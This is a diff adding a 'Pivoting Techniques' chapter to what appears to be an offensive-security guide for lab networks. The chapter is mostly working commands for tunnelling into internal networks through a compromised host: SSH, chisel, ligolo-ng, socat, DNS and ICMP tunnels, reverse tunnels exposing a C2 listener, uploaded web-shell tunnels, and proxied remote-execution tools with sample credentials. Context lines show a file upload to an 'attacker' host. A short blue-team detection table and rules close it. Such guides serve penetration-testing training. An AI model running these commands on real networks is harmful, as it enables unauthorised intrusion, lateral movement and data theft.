@@ -16,8 +16,9 @@ A comprehensive guide to lateral movement, privilege escalation, UAC bypass, fil
 8. [Living Off the Land (LOLBins)](#living-off-the-land-lolbins)
 9. [Persistence Techniques](#persistence-techniques)
 10. [Defense Evasion](#defense-evasion)
-11. [Useful Tools & Projects](#useful-tools--projects)
-12. [Blue Team Detection](#blue-team-detection)
+11. [Pivoting Techniques](#pivoting-techniques)
+12. [Useful Tools & Projects](#useful-tools--projects)
+13. [Blue Team Detection](#blue-team-detection)
 
 ---
 
@@ -1875,6 +1876,720 @@ iwr http://attacker/file -OutFile C:\file
 
 # Upload
 Invoke-WebRequest -Uri http://attacker/upload -Method POST -InFile C:\file
+```
+
+---
+
+# Pivoting Techniques
+
+## What is Pivoting?
+
+Pivoting is using a compromised host to access other networks or systems that aren't directly reachable from your attack machine. The compromised host acts as a "pivot point" or relay.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                            Pivoting Overview                                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+┌──────────┐                    ┌──────────┐                    ┌──────────┐
+│ Attacker │    Accessible      │  Pivot   │   Internal Only    │  Target  │
+│   Kali   │ ─────────────────> │   Host   │ ─────────────────> │  Server  │
+│          │   192.168.56.x     │  (WS01)  │    10.10.10.x      │   (DB)   │
+└──────────┘                    └──────────┘                    └──────────┘
+192.168.56.100                  192.168.56.11                   10.10.10.50
+                                10.10.10.11
+                                    │
+                                    │  Pivot through WS01
+                                    │  to reach internal network
+                                    ▼
+                               ┌──────────┐
+                               │ Internal │
+                               │ Network  │
+                               │10.10.10.0│
+                               └──────────┘
+```
+
+## Types of Pivoting
+
+| Type | Description |
+|------|-------------|
+| **Local Port Forward** | Forward local port to remote destination through pivot |
+| **Remote Port Forward** | Forward pivot's port back to attacker |
+| **Dynamic Port Forward** | SOCKS proxy through pivot for flexible routing |
+| **Double Pivot** | Chain multiple pivots to reach deeper networks |
+
+---
+
+## 1. SSH Tunneling
+
+### Local Port Forwarding
+Forward a local port through the pivot to reach an internal target.
+
+```bash
+# Syntax: ssh -L [local_port]:[target_host]:[target_port] user@pivot_host
+
+# Forward local port 8080 to internal server 10.10.10.50:80 via pivot
+ssh -L 8080:10.10.10.50:80 user@192.168.56.11
+
+# Now access http://localhost:8080 to reach internal server
+
+# Forward local 3389 to internal RDP server
+ssh -L 3389:10.10.10.50:3389 user@192.168.56.11
+# Connect: rdesktop localhost
+
+# Multiple forwards
+ssh -L 8080:10.10.10.50:80 -L 3389:10.10.10.50:3389 user@192.168.56.11
+```
+
+### Remote Port Forwarding
+Make a port on the pivot accessible from your attacker machine (reverse tunnel).
+
+```bash
+# Syntax: ssh -R [remote_port]:[local_host]:[local_port] user@pivot_host
+
+# From compromised pivot, expose attacker's port 8080 on pivot's port 9999
+ssh -R 9999:localhost:8080 attacker@192.168.56.100
+
+# Now internal machines can reach attacker:8080 via pivot:9999
+
+# Expose attacker's C2 listener on pivot
+ssh -R 4444:localhost:4444 attacker@192.168.56.100
+# Internal victims connect to pivot:4444, traffic routes to attacker:4444
+```
+
+### Dynamic Port Forwarding (SOCKS Proxy)
+Create a SOCKS proxy for flexible routing through the pivot.
+
+```bash
+# Syntax: ssh -D [local_port] user@pivot_host
+
+# Create SOCKS5 proxy on local port 1080
+ssh -D 1080 user@192.168.56.11
+
+# Use with proxychains
+# Edit /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+proxychains nmap -sT -Pn 10.10.10.0/24
+proxychains crackmapexec smb 10.10.10.50
+proxychains evil-winrm -i 10.10.10.50 -u admin -p 'Password123!'
+
+# Or configure browser to use SOCKS5 proxy localhost:1080
+```
+
+### SSH Options for Pivoting
+```bash
+# Background the tunnel
+ssh -f -N -D 1080 user@192.168.56.11
+
+# -f : Background after authentication
+# -N : No command execution (just tunnel)
+# -T : Disable pseudo-terminal allocation
+
+# Keep tunnel alive
+ssh -o ServerAliveInterval=60 -D 1080 user@192.168.56.11
+
+# Through jump host (ProxyJump)
+ssh -J user@jumphost user@internal_target
+
+# Using ProxyCommand
+ssh -o ProxyCommand="ssh -W %h:%p user@pivot" user@internal_target
+```
+
+---
+
+## 2. Chisel (HTTP Tunnel)
+
+### Concept
+Chisel creates TCP tunnels over HTTP, useful for bypassing firewalls.
+
+### Setup
+
+**On Attacker (Server Mode)**
+```bash
+# Start chisel server
+./chisel server -p 8080 --reverse
+
+# With authentication
+./chisel server -p 8080 --reverse --auth user:password
+```
+
+**On Pivot (Client Mode)**
+```bash
+# Reverse SOCKS proxy (most common)
+./chisel client 192.168.56.100:8080 R:socks
+
+# Now attacker has SOCKS5 on localhost:1080
+
+# Reverse port forward
+./chisel client 192.168.56.100:8080 R:4444:10.10.10.50:445
+
+# Forward local port (less common)
+./chisel client 192.168.56.100:8080 8888:10.10.10.50:80
+```
+
+### Usage with Proxychains
+```bash
+# /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+# Use tools through pivot
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains crackmapexec smb 10.10.10.50 -u admin -p 'Password123!'
+proxychains impacket-psexec admin:'Password123!'@10.10.10.50
+```
+
+### Windows Chisel
+```powershell
+# On Windows pivot
+.\chisel.exe client 192.168.56.100:8080 R:socks
+
+# With authentication
+.\chisel.exe client --auth user:password 192.168.56.100:8080 R:socks
+```
+
+---
+
+## 3. Ligolo-ng (Modern Tunneling)
+
+### Concept
+Ligolo-ng creates a virtual network interface, making pivoting feel like direct access.
+
+### Setup
+
+**On Attacker**
+```bash
+# Create TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy server
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# In ligolo console, after agent connects:
+ligolo-ng » session
+ligolo-ng » ifconfig  # View agent's interfaces
+ligolo-ng » start     # Start the tunnel
+
+# Add route to internal network
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+**On Pivot (Agent)**
+```bash
+# Linux
+./agent -connect 192.168.56.100:11601 -ignore-cert
+
+# Windows
+.\agent.exe -connect 192.168.56.100:11601 -ignore-cert
+```
+
+### Usage
+```bash
+# After tunnel is established, access internal network directly!
+nmap -sT -Pn 10.10.10.50
+crackmapexec smb 10.10.10.50 -u admin -p 'Password123!'
+evil-winrm -i 10.10.10.50 -u admin -p 'Password123!'
+
+# No proxychains needed - it's like being on the network
+```
+
+### Port Forwarding in Ligolo-ng
+```bash
+# In ligolo console
+ligolo-ng » listener_add --addr 0.0.0.0:1234 --to 10.10.10.50:80
+
+# Now attacker:1234 forwards to internal 10.10.10.50:80
+```
+
+---
+
+## 4. Metasploit Pivoting
+
+### Route Through Session
+```bash
+# After getting meterpreter session
+meterpreter > run autoroute -s 10.10.10.0/24
+
+# Or from msf console
+msf6 > use post/multi/manage/autoroute
+msf6 > set SESSION 1
+msf6 > set SUBNET 10.10.10.0
+msf6 > run
+
+# View routes
+msf6 > route print
+```
+
+### SOCKS Proxy
+```bash
+# Start SOCKS proxy
+msf6 > use auxiliary/server/socks_proxy
+msf6 > set SRVPORT 1080
+msf6 > set VERSION 5
+msf6 > run -j
+
+# Use with proxychains
+proxychains nmap -sT -Pn 10.10.10.50
+```
+
+### Port Forwarding
+```bash
+# In meterpreter
+meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.50
+
+# -l : Local port on attacker
+# -p : Remote port on target
+# -r : Remote host through pivot
+
+# List forwards
+meterpreter > portfwd list
+
+# Delete forward
+meterpreter > portfwd delete -l 8080
+meterpreter > portfwd flush  # Delete all
+```
+
+### Double Pivot Example
+```bash
+# Session 1: Pivot1 (192.168.56.11)
+# Session 2: Pivot2 (10.10.10.50) - obtained through pivot1
+
+# Route through both
+msf6 > route add 10.10.10.0/24 1    # Via session 1
+msf6 > route add 172.16.0.0/24 2    # Via session 2
+
+# Now can reach 172.16.0.0/24 through double pivot
+```
+
+---
+
+## 5. Windows Native Pivoting
+
+### Netsh Port Forwarding
+```powershell
+# Add port forward (requires admin)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50
+
+# List forwards
+netsh interface portproxy show all
+
+# Delete forward
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+
+# Reset all
+netsh interface portproxy reset
+```
+
+### Firewall Rules for Port Forward
+```powershell
+# Allow incoming on forwarded port
+netsh advfirewall firewall add rule name="Forward 8080" dir=in action=allow protocol=tcp localport=8080
+
+# Delete rule
+netsh advfirewall firewall delete rule name="Forward 8080"
+```
+
+### SSH on Windows (OpenSSH)
+```powershell
+# If OpenSSH is installed (Win10+)
+# Dynamic SOCKS proxy
+ssh -D 1080 user@192.168.56.100
+
+# Local forward
+ssh -L 8080:10.10.10.50:80 user@192.168.56.100
+```
+
+### Plink (PuTTY CLI)
+```powershell
+# Dynamic SOCKS
+plink.exe -D 1080 user@192.168.56.100
+
+# Local forward
+plink.exe -L 8080:10.10.10.50:80 user@192.168.56.100
+
+# Remote forward
+plink.exe -R 4444:127.0.0.1:4444 user@192.168.56.100
+```
+
+---
+
+## 6. SOCKS Proxies
+
+### Setting Up Proxychains
+```bash
+# /etc/proxychains4.conf
+
+# Strict chain (each proxy in order, fail if one fails)
+strict_chain
+
+# Dynamic chain (skip dead proxies)
+# dynamic_chain
+
+# Random chain
+# random_chain
+
+# Proxy list (at bottom of file)
+[ProxyList]
+socks5 127.0.0.1 1080
+
+# Multiple proxies (chained)
+socks5 127.0.0.1 1080
+socks5 127.0.0.1 1081
+```
+
+### Using Proxychains
+```bash
+# Basic usage
+proxychains <command>
+
+# Examples
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains curl http://10.10.10.50
+proxychains ssh user@10.10.10.50
+proxychains crackmapexec smb 10.10.10.50
+proxychains evil-winrm -i 10.10.10.50 -u admin -p 'Password123!'
+
+# Quiet mode
+proxychains -q nmap -sT -Pn 10.10.10.50
+```
+
+### FoxyProxy (Browser)
+```
+Configure browser extension:
+- Proxy Type: SOCKS5
+- Proxy IP: 127.0.0.1
+- Port: 1080
+- Enable for internal network patterns
+```
+
+---
+
+## 7. Socat Pivoting
+
+### Port Forwarding
+```bash
+# Forward local port to remote
+socat TCP-LISTEN:8080,fork TCP:10.10.10.50:80
+
+# Fork allows multiple connections
+
+# Bidirectional forward
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.50:80
+```
+
+### SOCKS Proxy with Socat
+```bash
+# Not native, but can relay to SOCKS
+socat TCP-LISTEN:1080,fork SOCKS4:pivot_ip:target_ip:target_port
+```
+
+### Encrypted Tunnel
+```bash
+# Generate certificates
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
+
+# Server (attacker)
+socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:10.10.10.50:80
+
+# Client (pivot)
+socat TCP-LISTEN:8080,fork OPENSSL:attacker_ip:443,verify=0
+```
+
+---
+
+## 8. sshuttle (VPN over SSH)
+
+### Concept
+sshuttle creates a VPN-like connection over SSH without requiring root on the pivot.
+
+### Usage
+```bash
+# Basic - route all traffic to subnet through pivot
+sshuttle -r user@192.168.56.11 10.10.10.0/24
+
+# Multiple subnets
+sshuttle -r user@192.168.56.11 10.10.10.0/24 172.16.0.0/16
+
+# All traffic (be careful!)
+sshuttle -r user@192.168.56.11 0/0
+
+# Exclude certain hosts
+sshuttle -r user@192.168.56.11 10.10.10.0/24 -x 10.10.10.1
+
+# DNS through tunnel
+sshuttle --dns -r user@192.168.56.11 10.10.10.0/24
+
+# Verbose
+sshuttle -vvr user@192.168.56.11 10.10.10.0/24
+```
+
+### After sshuttle
+```bash
+# Access internal network directly (no proxychains needed)
+nmap -sT -Pn 10.10.10.50
+curl http://10.10.10.50
+ssh admin@10.10.10.50
+```
+
+---
+
+## 9. Rpivot (Reverse SOCKS)
+
+### Concept
+Reverse SOCKS proxy - client on pivot connects back to server on attacker.
+
+### Setup
+
+**On Attacker**
+```bash
+python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
+```
+
+**On Pivot**
+```bash
+# Linux
+python client.py --server-ip 192.168.56.100 --server-port 9999
+
+# Windows
+python client.py --server-ip 192.168.56.100 --server-port 9999
+```
+
+### Usage
+```bash
+# Configure proxychains to use localhost:1080
+proxychains nmap -sT -Pn 10.10.10.0/24
+```
+
+---
+
+## 10. dnscat2 (DNS Tunneling)
+
+### Concept
+Tunnel traffic through DNS queries - useful when only DNS is allowed outbound.
+
+### Setup
+
+**On Attacker**
+```bash
+# Start server
+ruby dnscat2.rb tunnel.attacker.com
+
+# Or without domain
+ruby dnscat2.rb --dns "host=0.0.0.0,port=53" --no-cache
+```
+
+**On Pivot**
+```bash
+# Linux
+./dnscat --dns server=192.168.56.100
+
+# Windows
+dnscat2.exe --dns server=192.168.56.100
+
+# With domain
+./dnscat tunnel.attacker.com
+```
+
+### Commands
+```bash
+# In dnscat2 console
+dnscat2> windows           # List sessions
+dnscat2> window -i 1       # Interact with session
+command> shell             # Get shell
+command> listen 8080 10.10.10.50:80  # Port forward
+```
+
+---
+
+## 11. ICMP Tunneling
+
+### icmptunnel
+```bash
+# On attacker (server)
+./icmptunnel -s
+
+# On pivot (client)
+./icmptunnel 192.168.56.100
+
+# Creates tunnel interface for traffic
+```
+
+### ptunnel-ng
+```bash
+# Server (attacker)
+ptunnel-ng -r192.168.56.100 -R22
+
+# Client (pivot) - forward SSH through ICMP
+ptunnel-ng -p192.168.56.100 -l2222 -r10.10.10.50 -R22
+
+# Connect to local port
+ssh -p 2222 user@localhost
+```
+
+---
+
+## 12. HTTP Tunneling
+
+### reGeorg / Neo-reGeorg
+```bash
+# Upload tunnel.aspx/php/jsp to web server
+
+# Connect with reGeorg
+python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
+
+# Use proxychains
+proxychains nmap -sT -Pn 10.10.10.0/24
+```
+
+### ABPTTS
+```bash
+# Upload abptts.aspx to target
+
+# Connect
+python abpttsclient.py -c config.txt -u http://target/abptts.aspx -f 127.0.0.1:8080/10.10.10.50:80
+```
+
+### Tunna
+```bash
+# Upload conn.aspx/php/jsp
+
+# Connect
+python proxy.py -u http://target/conn.aspx -l 8080 -r 80 -a 10.10.10.50
+```
+
+---
+
+## 13. Double/Multi-Pivot
+
+### Concept
+Chain multiple pivots to reach deeply segmented networks.
+
+```
+Attacker → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Secure Zone)
+```
+
+### SSH Double Pivot
+```bash
+# Method 1: ProxyJump
+ssh -J user@pivot1,user@pivot2 user@target
+
+# Method 2: Nested tunnels
+# First tunnel to pivot1
+ssh -D 1080 user@pivot1
+
+# Second tunnel through first (using proxychains)
+proxychains ssh -D 1081 user@pivot2
+
+# Now use 1081 to reach target network
+```
+
+### Chisel Double Pivot
+```bash
+# Attacker: Start server
+./chisel server -p 8080 --reverse
+
+# Pivot1: Connect back, create SOCKS
+./chisel client attacker:8080 R:1080:socks
+
+# From attacker through pivot1 to pivot2
+proxychains ./chisel client pivot2:8888 R:1081:socks
+
+# On pivot2: chisel server
+./chisel server -p 8888 --reverse
+
+# Now attacker has two SOCKS: 1080 (pivot1) and 1081 (pivot2)
+```
+
+### Metasploit Double Pivot
+```bash
+# Session 1 on Pivot1
+msf6 > route add 10.10.10.0/24 1
+
+# Exploit through to Pivot2
+msf6 > use exploit/...
+msf6 > set RHOSTS 10.10.10.50
+msf6 > run
+
+# Session 2 on Pivot2
+msf6 > route add 172.16.0.0/24 2
+
+# Now can reach 172.16.0.0/24 through double pivot
+```
+
+### Ligolo-ng Double Pivot
+```bash
+# First pivot established
+# In ligolo, use listener to reach pivot2
+
+ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
+
+# Run second agent on pivot2, connecting to pivot1:11601
+# Ligolo handles the chaining automatically
+```
+
+---
+
+## 14. Pivoting Quick Reference
+
+| Technique | Command |
+|-----------|---------|
+| SSH Local Forward | `ssh -L 8080:target:80 user@pivot` |
+| SSH Remote Forward | `ssh -R 9999:localhost:8080 user@pivot` |
+| SSH Dynamic (SOCKS) | `ssh -D 1080 user@pivot` |
+| Chisel Reverse SOCKS | Server: `chisel server -p 8080 --reverse` Client: `chisel client attacker:8080 R:socks` |
+| Ligolo-ng | Proxy: `./proxy -selfcert` Agent: `./agent -connect proxy:11601 -ignore-cert` |
+| Metasploit Route | `route add 10.10.10.0/24 <session_id>` |
+| Metasploit SOCKS | `use auxiliary/server/socks_proxy` |
+| Netsh Port Forward | `netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=target` |
+| sshuttle | `sshuttle -r user@pivot 10.10.10.0/24` |
+| Proxychains | `proxychains <command>` |
+
+---
+
+## Pivoting Tools Reference
+
+| Tool | Description | URL |
+|------|-------------|-----|
+| Chisel | HTTP tunnel | https://github.com/jpillora/chisel |
+| Ligolo-ng | TUN-based pivot | https://github.com/nicocha30/ligolo-ng |
+| sshuttle | VPN over SSH | https://github.com/sshuttle/sshuttle |
+| Rpivot | Reverse SOCKS | https://github.com/klsecservices/rpivot |
+| dnscat2 | DNS tunnel | https://github.com/iagox86/dnscat2 |
+| reGeorg | HTTP tunnel | https://github.com/sensepost/reGeorg |
+| Neo-reGeorg | HTTP tunnel | https://github.com/L-codes/Neo-reGeorg |
+| ptunnel-ng | ICMP tunnel | https://github.com/lnslbrty/ptunnel-ng |
+| Proxychains | SOCKS wrapper | https://github.com/haad/proxychains |
+| Socat | Multipurpose relay | http://www.dest-unreach.org/socat/ |
+
+---
+
+## Blue Team: Pivoting Detection
+
+| Indicator | Detection |
+|-----------|-----------|
+| Unusual outbound SSH | Monitor port 22 to unexpected destinations |
+| HTTP CONNECT | Proxy-like behavior over HTTP |
+| DNS tunneling | Large TXT records, unusual query patterns |
+| ICMP tunneling | Large/frequent ICMP packets |
+| Port forwarding | netsh portproxy entries |
+| SOCKS traffic | Unusual SOCKS protocol on network |
+| Chisel/Ligolo | Known binary signatures, HTTP upgrade patterns |
+| Internal scanning | Host scanning internal ranges after compromise |
+
+**Detection Queries:**
+```yaml
+# Detect SSH tunneling
+rule: Process cmd contains "-D" or "-L" or "-R" with ssh
+
+# Detect netsh port forwarding
+rule: Command contains "netsh interface portproxy"
+
+# Detect Chisel
+rule: HTTP Upgrade header contains "chisel"
+
+# Detect unusual ICMP
+rule: ICMP packet size > 100 bytes frequently
 ```
 
 ---
